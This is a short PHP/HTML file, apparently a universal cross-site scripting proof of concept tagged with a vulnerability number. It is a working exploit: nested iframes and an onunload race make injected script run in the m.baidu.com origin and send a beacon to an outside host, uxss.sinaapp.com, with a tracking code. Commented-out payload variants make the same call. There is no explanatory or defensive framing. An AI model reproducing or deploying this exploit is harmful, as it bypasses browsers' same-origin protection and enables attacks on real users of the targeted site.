<?php
//漏洞编号：143439
?>
<?php
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);


//$str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=3';}}";
//$str = "if(parent.document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=6';}";
//$str = "alert(1);";

//$tmp = str_split($str);
//$result = array();

//foreach($tmp as $key => $value){
//    $result[$key] = ord($value);
//}

//$input = implode(",", $result);

?>

<body>
<script>
	parentFrame = document.body.appendChild(document.createElement("iframe"));
	helperFrame1 = parentFrame.contentDocument.body.appendChild(document.createElement("iframe"));
	helperFrame1.contentWindow.onunload = function() {
		container = document.createElement("div");
		targetFrame  = container.appendChild(document.createElement("iframe"));
		helperFrame2 = targetFrame.appendChild(document.createElement("iframe"));
		helperFrame2.src = "javascript:top.container.removeChild(top.targetFrame)";
		parentFrame.contentDocument.body.appendChild(container);
	}
	parentFrame.src = "http://m.baidu.com";
	parentFrame.onload = function() {
		parentFrame.onload = null;

        targetFrame.srcdoc = "<script>if(parent.document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=<?php echo $code;?>&suc=3';}<\/script>";
		targetFrame.contentWindow.location = "about:srcdoc";
	}
</script>
</body>